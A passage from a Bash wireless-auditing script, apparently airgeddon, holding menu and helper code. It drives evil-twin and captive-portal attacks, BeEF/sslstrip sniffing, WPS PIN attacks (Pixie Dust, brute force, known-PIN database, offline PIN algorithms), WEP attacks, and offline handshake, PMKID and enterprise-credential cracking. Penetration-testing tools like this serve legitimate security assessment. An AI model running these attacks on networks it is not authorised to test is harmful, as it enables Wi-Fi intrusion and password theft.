						ports_needed["tcp"]="${dns_port} ${www_port}"
						ports_needed["udp"]="${dns_port} ${dhcp_port}"
						if check_busy_ports; then

							et_mode="et_captive_portal"
							echo
							language_strings "${language}" 316 "yellow"
							language_strings "${language}" 115 "read"

							if explore_for_targets_option "WPA"; then
								et_dos_menu
							fi
						fi
					fi
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	evil_twin_attacks_menu
}

#beef pre attack menu
function beef_pre_menu() {

	debug_print

	if [ "${return_to_et_main_menu_from_beef}" -eq 1 ]; then
		return
	fi

	search_for_beef

	clear
	language_strings "${language}" 407 "title"
	current_menu="beef_pre_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 266
	print_simple_separator

	if [[ "${beef_found}" -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[17]}]} -eq 1 ]]; then
		if [[ ${optional_tools[${optional_tools_names[5]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[6]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[7]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[16]}]} -eq 1 ]]; then
			language_strings "${language}" 409 "warning"
			language_strings "${language}" 416 "pink"
		else
			language_strings "${language}" 409 et_sniffing_sslstrip2_beef_dependencies[@]
		fi
	else
		language_strings "${language}" 409 et_sniffing_sslstrip2_beef_dependencies[@]
	fi

	print_simple_separator
	language_strings "${language}" 410
	print_hint ${current_menu}

	read -rp "> " beef_option
	case ${beef_option} in
		0)
			return
		;;
		1)
			if contains_element "${beef_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				current_iface_on_messages="${interface}"
				if check_interface_wifi "${interface}"; then
					get_bettercap_version
					if compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_version}" && ! compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_sslstrip_working_version}"; then
						echo
						language_strings "${language}" 174 "red"
						language_strings "${language}" 115 "read"
						return
					fi

					if [ "${card_vif_support}" -eq 0 ]; then
						ask_yesno 696 "no"
						if [ "${yesno}" = "y" ]; then
							et_attack_adapter_prerequisites_ok=1
						else
							return_to_et_main_menu_from_beef=1
						fi
					else
						et_attack_adapter_prerequisites_ok=1
					fi

					if [ "${et_attack_adapter_prerequisites_ok}" -eq 1 ]; then

						declare -gA ports_needed
						ports_needed["tcp"]="2000 ${beef_port} 6789 ${bettercap_proxy_port}"
						ports_needed["udp"]="${dns_port} ${dhcp_port} ${bettercap_dns_port}"
						if check_busy_ports; then

							et_mode="et_sniffing_sslstrip2_beef"
							et_dos_menu
						fi
					fi
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		2)
			if [[ "${beef_found}" -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[17]}]} -eq 1 ]]; then
				echo
				language_strings "${language}" 412 "red"
				language_strings "${language}" 115 "read"
			else
				prepare_beef_start
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	beef_pre_menu
}

#WPS attacks menu
function wps_attacks_menu() {

	debug_print

	clear
	language_strings "${language}" 334 "title"
	current_menu="wps_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 59
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49 wash_scan_dependencies[@]
	language_strings "${language}" 50 "separator"
	language_strings "${language}" 345 bully_attacks_dependencies[@]
	language_strings "${language}" 357 reaver_attacks_dependencies[@]
	language_strings "${language}" 346 bully_pixie_dust_attack_dependencies[@]
	language_strings "${language}" 358 reaver_pixie_dust_attack_dependencies[@]
	language_strings "${language}" 347 bully_attacks_dependencies[@]
	language_strings "${language}" 359 reaver_attacks_dependencies[@]
	language_strings "${language}" 348 bully_attacks_dependencies[@]
	language_strings "${language}" 360 reaver_attacks_dependencies[@]
	language_strings "${language}" 622 reaver_attacks_dependencies[@]
	print_simple_separator
	language_strings "${language}" 494
	print_hint ${current_menu}

	read -rp "> " wps_option
	case ${wps_option} in
		0)
			return
		;;
		1)
			select_interface
		;;
		2)
			monitor_option "${interface}"
		;;
		3)
			managed_option "${interface}"
		;;
		4)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_reaver_version
				explore_for_wps_targets_option
			fi
		;;
		5)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="custompin_bully"
				get_bully_version
				set_bully_verbosity
				if wps_attacks_parameters; then
					manage_wps_log
					exec_wps_custom_pin_bully_attack
				fi
			fi
		;;
		6)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="custompin_reaver"
				if wps_attacks_parameters; then
					manage_wps_log
					exec_wps_custom_pin_reaver_attack
				fi
			fi
		;;
		7)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="pixiedust_bully"
				get_bully_version
				set_bully_verbosity
				if validate_bully_pixiewps_version; then
					echo
					language_strings "${language}" 368 "yellow"
					language_strings "${language}" 115 "read"
					if wps_attacks_parameters; then
						manage_wps_log
						exec_bully_pixiewps_attack
					fi
				else
					echo
					language_strings "${language}" 367 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		8)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="pixiedust_reaver"
				get_reaver_version
				if validate_reaver_pixiewps_version; then
					echo
					language_strings "${language}" 370 "yellow"
					language_strings "${language}" 115 "read"
					if wps_attacks_parameters; then
						manage_wps_log
						exec_reaver_pixiewps_attack
					fi
				else
					echo
					language_strings "${language}" 371 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		9)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="bruteforce_bully"
				get_bully_version
				set_bully_verbosity
				if wps_attacks_parameters; then
					manage_wps_log
					exec_wps_bruteforce_pin_bully_attack
				fi
			fi
		;;
		10)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="bruteforce_reaver"
				get_reaver_version
				if wps_attacks_parameters; then
					manage_wps_log
					exec_wps_bruteforce_pin_reaver_attack
				fi
			fi
		;;
		11)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="pindb_bully"
				get_bully_version
				set_bully_verbosity

				db_error=0
				if [[ "${pin_dbfile_checked}" -eq 0 ]] || [[ ! -f "${scriptfolder}${known_pins_dbfile}" ]]; then
					if check_pins_database_file; then
						echo
						language_strings "${language}" 373 "blue"
					else
						echo
						language_strings "${language}" 372 "red"
						db_error=1
					fi
				else
					echo
					language_strings "${language}" 379 "blue"
				fi
				language_strings "${language}" 115 "read"

				if [ "${db_error}" -eq 0 ]; then
					if wps_attacks_parameters; then
						manage_wps_log
						exec_wps_pin_database_bully_attack
					fi
				fi
			fi
		;;
		12)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="pindb_reaver"
				get_reaver_version

				db_error=0
				if [[ "${pin_dbfile_checked}" -eq 0 ]] || [[ ! -f "${scriptfolder}${known_pins_dbfile}" ]]; then
					if check_pins_database_file; then
						echo
						language_strings "${language}" 373 "blue"
					else
						echo
						language_strings "${language}" 372 "red"
						db_error=1
					fi
				else
					echo
					language_strings "${language}" 379 "blue"
				fi
				language_strings "${language}" 115 "read"
				if [ "${db_error}" -eq 0 ]; then
					if wps_attacks_parameters; then
						manage_wps_log
						exec_wps_pin_database_reaver_attack
					fi
				fi
			fi
		;;
		13)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="nullpin_reaver"
				get_reaver_version
				if validate_reaver_nullpin_version; then
					echo
					language_strings "${language}" 623 "yellow"
					language_strings "${language}" 115 "read"
					if wps_attacks_parameters; then
						manage_wps_log
						exec_reaver_nullpin_attack
					fi
				else
					echo
					language_strings "${language}" 624 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		14)
			offline_pin_generation_menu
		;;
		*)
			invalid_menu_option
		;;
	esac

	wps_attacks_menu
}

#Offline pin generation menu
function offline_pin_generation_menu() {

	debug_print

	clear
	language_strings "${language}" 495 "title"
	current_menu="offline_pin_generation_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 497
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49 wash_scan_dependencies[@]
	language_strings "${language}" 498 "separator"
	language_strings "${language}" 496
	echo "6.  ComputePIN"
	echo "7.  EasyBox"
	echo "8.  Arcadyan"
	print_hint ${current_menu}

	read -rp "> " offline_pin_generation_option
	case ${offline_pin_generation_option} in
		0)
			return
		;;
		1)
			select_interface
		;;
		2)
			monitor_option "${interface}"
		;;
		3)
			managed_option "${interface}"
		;;
		4)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_reaver_version
				explore_for_wps_targets_option
			fi
		;;
		5)
			db_error=0
			if [[ "${pin_dbfile_checked}" -eq 0 ]] || [[ ! -f "${scriptfolder}${known_pins_dbfile}" ]]; then
				if check_pins_database_file; then
					echo
					language_strings "${language}" 373 "blue"
				else
					echo
					language_strings "${language}" 372 "red"
					db_error=1
				fi
			else
				echo
				language_strings "${language}" 379 "blue"
			fi
			language_strings "${language}" 115 "read"

			if [ "${db_error}" -eq 0 ]; then
				if wps_attacks_parameters "no_monitor_check"; then
					wps_pin_database_prerequisites "no_attack"
					if [ "${bssid_found_in_db}" -eq 1 ]; then
						echo
						language_strings "${language}" 499 "blue"
						echo "${wps_data_array["${wps_bssid}",'Database']}"
						echo
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		6)
			if wps_attacks_parameters "no_monitor_check"; then
				if ! check_if_type_exists_in_wps_data_array "${wps_bssid}" "ComputePIN"; then
					set_wps_mac_parameters
					calculate_computepin_algorithm_step1
					pin_checksum_rule "${computepin_pin}"
					calculate_computepin_algorithm_step2
					fill_wps_data_array "${wps_bssid}" "ComputePIN" "${computepin_pin}"
				fi

				echo
				language_strings "${language}" 500 "blue"
				echo "${wps_data_array["${wps_bssid}",'ComputePIN']}"
				echo
				language_strings "${language}" 115 "read"
			fi
		;;
		7)
			if wps_attacks_parameters "no_monitor_check"; then
				if ! check_if_type_exists_in_wps_data_array "${wps_bssid}" "EasyBox"; then
					set_wps_mac_parameters
					calculate_easybox_algorithm
					pin_checksum_rule "${easybox_pin}"
					easybox_pin=$(printf '%08d\n' $((current_calculated_pin + checksum_digit)))
					fill_wps_data_array "${wps_bssid}" "EasyBox" "${easybox_pin}"
				fi

				echo
				language_strings "${language}" 501 "blue"
				echo "${wps_data_array["${wps_bssid}",'EasyBox']}"
				echo
				language_strings "${language}" 115 "read"
			fi
		;;
		8)
			if wps_attacks_parameters "no_monitor_check"; then
				offline_arcadyan_pin_can_be_shown=0
				if ! check_if_type_exists_in_wps_data_array "${wps_bssid}" "Arcadyan"; then

					ask_yesno 504 "yes"
					if [ "${yesno}" = "y" ]; then

						if check_monitor_enabled "${interface}"; then
							if hash wash 2> /dev/null; then
								if check_json_option_on_wash; then

									echo
									language_strings "${language}" 489 "blue"

									serial=""
									if wash_json_scan "${wps_bssid}"; then
										if [ -n "${serial}" ]; then
											if [[ "${serial}" =~ ^[0-9]{4}$ ]]; then
												set_wps_mac_parameters
												calculate_arcadyan_algorithm
												pin_checksum_rule "${arcadyan_pin}"
												arcadyan_pin="${arcadyan_pin}${checksum_digit}"
												fill_wps_data_array "${wps_bssid}" "Arcadyan" "${arcadyan_pin}"
												offline_arcadyan_pin_can_be_shown=1
											else
												echo
												language_strings "${language}" 491 "yellow"
												language_strings "${language}" 115 "read"
											fi
											echo
										else
											echo
											language_strings "${language}" 488 "red"
											language_strings "${language}" 115 "read"
										fi
									fi
								else
									echo
									language_strings "${language}" 486 "red"
									language_strings "${language}" 115 "read"
								fi
							else
								echo
								language_strings "${language}" 492 "red"
								language_strings "${language}" 115 "read"
							fi
						else
							echo
							language_strings "${language}" 14 "red"
							language_strings "${language}" 115 "read"
						fi
					fi
				else
					echo
					language_strings "${language}" 503 "yellow"
					language_strings "${language}" 115 "read"
					offline_arcadyan_pin_can_be_shown=1
				fi

				if [ "${offline_arcadyan_pin_can_be_shown}" -eq 1 ]; then
					echo
					language_strings "${language}" 502 "blue"
					echo "${wps_data_array["${wps_bssid}",'Arcadyan']}"
					echo
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	offline_pin_generation_menu
}

#WEP attacks menu
function wep_attacks_menu() {

	debug_print

	clear
	language_strings "${language}" 427 "title"
	current_menu="wep_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 59
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 50 "separator"
	language_strings "${language}" 423 wep_attack_allinone_dependencies[@]
	language_strings "${language}" 723 wep_attack_besside_dependencies[@]
	print_hint ${current_menu}

	read -rp "> " wep_option
	case ${wep_option} in
		0)
			return
		;;
		1)
			select_interface
		;;
		2)
			monitor_option "${interface}"
		;;
		3)
			managed_option "${interface}"
		;;
		4)
			explore_for_targets_option "WEP"
		;;
		5)
			if contains_element "${wep_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wep_attack_option "allinone"
			fi
		;;
		6)
			if contains_element "${wep_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wep_attack_option "besside"
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	wep_attacks_menu
}

#Offline decryption attacks menu
function decrypt_menu() {

	debug_print

	clear
	language_strings "${language}" 170 "title"
	current_menu="decrypt_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 59
	language_strings "${language}" 534
	language_strings "${language}" 535
	print_hint ${current_menu}

	read -rp "> " decrypt_option
	case ${decrypt_option} in
		0)
			return
		;;
		1)
			personal_decrypt_menu
		;;
		2)
			enterprise_decrypt_menu
		;;
		*)
			invalid_menu_option
		;;
	esac

	decrypt_menu
}

#Offline personal decryption attacks menu
function personal_decrypt_menu() {

	debug_print

	clear
	language_strings "${language}" 170 "title"
	current_menu="personal_decrypt_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 536
	language_strings "${language}" 176 "separator"
	language_strings "${language}" 172
	language_strings "${language}" 175 aircrack_crunch_attacks_dependencies[@]
	language_strings "${language}" 229 "separator"
	language_strings "${language}" 230 hashcat_attacks_dependencies[@]
	language_strings "${language}" 231 hashcat_attacks_dependencies[@]
	language_strings "${language}" 232 hashcat_attacks_dependencies[@]
	language_strings "${language}" 668 hashcat_attacks_dependencies[@]
	language_strings "${language}" 669 hashcat_attacks_dependencies[@]
	language_strings "${language}" 670 hashcat_attacks_dependencies[@]
	print_hint ${current_menu}

	read -rp "> " personal_decrypt_option
	case ${personal_decrypt_option} in
		0)
			return
		;;
		1)
			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				aircrack_dictionary_attack_option
			fi
		;;
		2)
			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				aircrack_bruteforce_attack_option
			fi
		;;
		3)
			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				set_hashcat_parameters
				hashcat_dictionary_attack_option "personal_handshake"
			fi
		;;
		4)
			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				set_hashcat_parameters
				hashcat_bruteforce_attack_option "personal_handshake"
			fi
		;;
		5)
			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				set_hashcat_parameters
				hashcat_rulebased_attack_option "personal_handshake"
			fi
		;;
		6)
			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				if validate_hashcat_pmkid_version; then
					echo
					language_strings "${language}" 678 "yellow"
					language_strings "${language}" 115 "read"
					set_hashcat_parameters
					hashcat_dictionary_attack_option "personal_pmkid"
				else
					echo
					language_strings "${language}" 679 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		7)
			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				if validate_hashcat_pmkid_version; then
					echo
					language_strings "${language}" 678 "yellow"
					language_strings "${language}" 115 "read"
					set_hashcat_parameters
					hashcat_bruteforce_attack_option "personal_pmkid"
				else
					echo
					language_strings "${language}" 679 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		8)
			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				if validate_hashcat_pmkid_version; then
					echo
					language_strings "${language}" 678 "yellow"
					language_strings "${language}" 115 "read"
					set_hashcat_parameters
					hashcat_rulebased_attack_option "personal_pmkid"
				else
					echo
					language_strings "${language}" 679 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	personal_decrypt_menu
}

#Offline enterprise decryption attacks menu
function enterprise_decrypt_menu() {

	debug_print

	clear
	language_strings "${language}" 170 "title"
	current_menu="enterprise_decrypt_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 536
	language_strings "${language}" 544 "separator"
	language_strings "${language}" 545 john_attacks_dependencies[@]
	language_strings "${language}" 546 johncrunch_attacks_dependencies[@]
	language_strings "${language}" 229 "separator"
	language_strings "${language}" 550 hashcat_attacks_dependencies[@]
	language_strings "${language}" 551 hashcat_attacks_dependencies[@]
	language_strings "${language}" 552 hashcat_attacks_dependencies[@]
	language_strings "${language}" 548 "separator"
	language_strings "${language}" 549 asleap_attacks_dependencies[@]
	print_hint ${current_menu}

	read -rp "> " enterprise_decrypt_option
	case ${enterprise_decrypt_option} in
		0)
			return
		;;
		1)
			if contains_element "${enterprise_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_jtr_version
				enterprise_jtr_dictionary_attack_option
			fi
		;;
		2)
			if contains_element "${enterprise_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_jtr_version
				enterprise_jtr_bruteforce_attack_option
			fi
		;;
		3)
			if contains_element "${enterprise_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				set_hashcat_parameters
				hashcat_dictionary_attack_option "enterprise"
			fi
		;;
		4)
			if contains_element "${enterprise_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				set_hashcat_parameters
				hashcat_bruteforce_attack_option "enterprise"
			fi
		;;
		5)
			if contains_element "${enterprise_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				set_hashcat_parameters
				hashcat_rulebased_attack_option "enterprise"
			fi
		;;
		6)
			if contains_element "${enterprise_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				enterprise_asleap_dictionary_attack_option
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	enterprise_decrypt_menu
}

#Read the user input on rules file questions
function ask_rules() {

	debug_print

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "rules"
	done
	language_strings "${language}" 241 "yellow"
}

#Read the user input on dictionary file questions
function ask_dictionary() {

	debug_print

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "dictionary"
	done
	language_strings "${language}" 181 "yellow"
}

#Read the user input on Handshake/enterprise file questions
function ask_capture_file() {

	debug_print

	validpath=1

	if [ "${1}" = "personal_handshake" ]; then
		while [[ "${validpath}" != "0" ]]; do
			read_path "targetfilefordecrypt"
		done
	elif [ "${1}" = "personal_pmkid" ]; then
		while [[ "${validpath}" != "0" ]]; do
			read_path "targethashcatpmkidfilefordecrypt"
		done
	else
		if [ "${2}" = "hashcat" ]; then
			while [[ "${validpath}" != "0" ]]; do
				read_path "targethashcatenterprisefilefordecrypt"
			done
		else
			while [[ "${validpath}" != "0" ]]; do
				read_path "targetjtrenterprisefilefordecrypt"
			done
		fi
	fi
	language_strings "${language}" 189 "yellow"
}

#Manage the questions on Handshake/enterprise file questions
function manage_asking_for_captured_file() {

	debug_print

	if [ "${1}" = "personal_handshake" ]; then
		if [ -n "${enteredpath}" ]; then
			echo
			language_strings "${language}" 186 "blue"
			ask_yesno 187 "yes"
			if [ "${yesno}" = "n" ]; then
				ask_capture_file "${1}" "${2}"
			fi
		else
			ask_capture_file "${1}" "${2}"
		fi
	elif [ "${1}" = "personal_pmkid" ]; then
		if [ -n "${hashcatpmkidenteredpath}" ]; then
			echo
			language_strings "${language}" 677 "blue"
			ask_yesno 187 "yes"
			if [ "${yesno}" = "n" ]; then
				ask_capture_file "${1}" "${2}"
			fi
		else
			ask_capture_file "${1}" "${2}"
		fi
	else
		if [ "${2}" = "hashcat" ]; then
			if [ -n "${hashcatenterpriseenteredpath}" ]; then
				echo
				language_strings "${language}" 600 "blue"
				ask_yesno 187 "yes"
				if [ "${yesno}" = "n" ]; then
					ask_capture_file "${1}" "${2}"
				fi
			else
				ask_capture_file "${1}" "${2}"
			fi
		else
			if [ -n "${jtrenterpriseenteredpath}" ]; then
				echo
				language_strings "${language}" 609 "blue"
				ask_yesno 187 "yes"
				if [ "${yesno}" = "n" ]; then
					ask_capture_file "${1}" "${2}"
				fi
			else
				ask_capture_file "${1}" "${2}"
			fi
		fi
	fi
}

#Manage the questions on challenge response input
manage_asking_for_challenge_response() {

	debug_print

	local regexp="^([[:xdigit:]]{2}:){7}[[:xdigit:]]{2}$"

	while [[ ! ${enterprise_asleap_challenge} =~ ${regexp} ]]; do
		read_challenge
	done

	regexp="^([[:xdigit:]]{2}:){23}[[:xdigit:]]{2}$"

	while [[ ! ${enterprise_asleap_response} =~ ${regexp} ]]; do
		read_response
	done
}

#Manage the questions on dictionary file questions
function manage_asking_for_dictionary_file() {

	debug_print

	if [ -n "${DICTIONARY}" ]; then
		echo
		language_strings "${language}" 183 "blue"
		ask_yesno 184 "yes"
		if [ "${yesno}" = "n" ]; then
			ask_dictionary
		fi
	else
		ask_dictionary
	fi
}

#Manage the questions on rules file questions
function manage_asking_for_rule_file() {

	debug_print

	if [ -n "${RULES}" ]; then
		echo
		language_strings "${language}" 239 "blue"
		ask_yesno 240 "yes"
		if [ "${yesno}" = "n" ]; then
			ask_rules
		fi
	else
		ask_rules
	fi
}

#Validate the file to be cleaned
function check_valid_file_to_clean() {

	debug_print

	nets_from_file=$(echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "WPA|WEP" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')

	if [ "${nets_from_file}" = "" ]; then
		return 1
	fi

	option_counter=0
	for item in ${nets_from_file}; do
		if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
			option_counter=$((option_counter + 1))
		fi
	done

	if [ "${option_counter}" -le 1 ]; then
		return 1
	fi

	handshakefilesize=$(wc -c "${filetoclean}" 2> /dev/null | awk -F " " '{print$1}')
	if [ "${handshakefilesize}" -le 1024 ]; then
		return 1
	fi

	if ! echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "1 handshake" > /dev/null; then
		return 1
	fi

	return 0
}

#Check if an essid is present on the mdk3/mdk4 log file to know if it is decloaked for that bssid
function check_essid_in_mdk_decloak_log() {

	debug_print

	local regexp
	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
		if ! grep -q "End of SSID list reached" "${tmpdir}decloak.log"; then
			regexp='SSID:[[:blank:]]\"([^\"]+)\"'
			[[ $(grep "${bssid}" "${tmpdir}decloak.log") =~ ${regexp} ]] && essid="${BASH_REMATCH[1]}"
		fi
	else
		regexp="Probe[[:blank:]]Response[[:blank:]]from[[:blank:]]target[[:blank:]]AP[[:blank:]]with[[:blank:]]SSID[[:blank:]]+([^[:blank:]]+.*[^[:blank:]]|[^[:blank:]])"
		[[ $(grep -m 1 "Probe Response from target AP with SSID" "${tmpdir}decloak.log") =~ ${regexp} ]] && essid="${BASH_REMATCH[1]}"
	fi

	if [ "${essid}" = "(Hidden Network)" ]; then
		return 1
	else
		return 0
	fi
}

#Check if an essid is present on a capture file to know if it is decloaked for that bssid
function check_essid_in_capture_file() {

	debug_print

	while IFS=, read -r exp_bssid _ _ _ _ _ _ _ _ _ _ _ _ exp_essid _; do

		chars_bssid=${#exp_bssid}
		if [ "${chars_bssid}" -ge 17 ]; then
			if [ "${exp_bssid}" = "${bssid}" ]; then
					exp_essid="${exp_essid#"${exp_essid%%[![:space:]]*}"}"
					exp_essid="${exp_essid%"${exp_essid##*[![:space:]]}"}"
				if [[ -n "${exp_essid}" ]] && [[ ${exp_essid} != "" ]]; then
					essid="${exp_essid}"
					break
				fi
			fi
		fi
	done < "${tmpdir}decloak-01.csv"

	if [ "${essid}" = "(Hidden Network)" ]; then
		return 1
	else
		return 0
	fi
}

#Check if a bssid is present on a capture file to know if there is a Handshake/PMKID with that bssid
function check_bssid_in_captured_file() {

	debug_print

	local nets_from_file
	nets_from_file=$(echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "WPA \([1-9][0-9]? handshake" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')

	if [ "${3}" = "also_pmkid" ]; then
		get_aircrack_version
		if compare_floats_greater_or_equal "${aircrack_version}" "${aircrack_pmkid_version}"; then
			local nets_from_file2
			nets_from_file2=$(echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "WPA \([1-9][0-9]? handshake|handshake, with PMKID" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')
		fi
	fi

	if [ "${2}" != "silent" ]; then
		if [ ! -f "${1}" ]; then
			echo
			language_strings "${language}" 161 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi

		if [[ "${2}" = "showing_msgs_checking" ]] && [[ "${3}" = "only_handshake" ]]; then
			if [ "${nets_from_file}" = "" ]; then
				echo
				language_strings "${language}" 216 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		fi

		if [[ "${2}" = "showing_msgs_checking" ]] && [[ "${3}" = "also_pmkid" ]]; then
			if [[ "${nets_from_file}" = "" ]] && [[ "${nets_from_file2}" = "" ]]; then
				echo
				language_strings "${language}" 682 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		fi
	fi

	declare -A bssids_detected
	declare -A bssids_detected_pmkid

	local option_counter
	option_counter=0
	for item in ${nets_from_file}; do
		if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
			option_counter=$((option_counter + 1))
			bssids_detected[${option_counter}]=${item}
		fi
	done

	if [[ "${3}" = "also_pmkid" ]] && [[ -n "${nets_from_file2}" ]]; then
		option_counter=0
		for item in ${nets_from_file2}; do
			if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
				option_counter=$((option_counter + 1))
				bssids_detected_pmkid[${option_counter}]=${item}
			fi
		done
	fi

	local handshake_captured=0
	local pmkid_captured=0

	for targetbssid in "${bssids_detected[@]}"; do
		if [ "${bssid}" = "${targetbssid}" ]; then
			handshake_captured=1
			break
		fi
	done

	if [[ "${3}" = "also_pmkid" ]] && [[ -n "${nets_from_file2}" ]]; then
		for targetbssid in "${bssids_detected_pmkid[@]}"; do
			if [ "${bssid}" = "${targetbssid}" ]; then
				pmkid_captured=1
				break
			fi
		done
	fi

	if [[ "${handshake_captured}" = "1" ]] || [[ "${pmkid_captured}" = "1" ]]; then
		if [[ "${2}" = "showing_msgs_capturing" ]] || [[ "${2}" = "showing_msgs_checking" ]]; then
			if ! is_wpa2_handshake "${1}" "${bssid}" > /dev/null 2>&1; then
				echo
				language_strings "${language}" 700 "red"
				language_strings "${language}" 115 "read"
				return 2
			fi
		fi
	fi

	if [[ "${handshake_captured}" = "1" ]] && [[ "${pmkid_captured}" = "0" ]]; then
		if [ "${2}" = "showing_msgs_checking" ]; then
			language_strings "${language}" 322 "yellow"
		fi
		return 0
	elif [[ "${handshake_captured}" = "0" ]] && [[ "${pmkid_captured}" = "1" ]]; then
		if [[ "${2}" = "showing_msgs_capturing" ]] && [[ "${3}" = "also_pmkid" ]]; then
			echo
			language_strings "${language}" 680 "yellow"
		fi
		if [[ "${2}" = "showing_msgs_checking" ]] && [[ "${3}" = "also_pmkid" ]]; then
			echo
			language_strings "${language}" 683 "yellow"
		fi
		return 0
	elif [[ "${handshake_captured}" = "1" ]] && [[ "${pmkid_captured}" = "1" ]]; then
		if [[ "${2}" = "showing_msgs_capturing" ]] && [[ "${3}" = "also_pmkid" ]]; then
			echo
			language_strings "${language}" 681 "yellow"
		fi
		if [[ "${2}" = "showing_msgs_checking" ]] && [[ "${3}" = "also_pmkid" ]]; then
			echo
			language_strings "${language}" 683 "yellow"
		fi
		return 0
	else
		if [[ "${2}" = "showing_msgs_checking" ]] && [[ "${3}" = "only_handshake" ]]; then
			echo
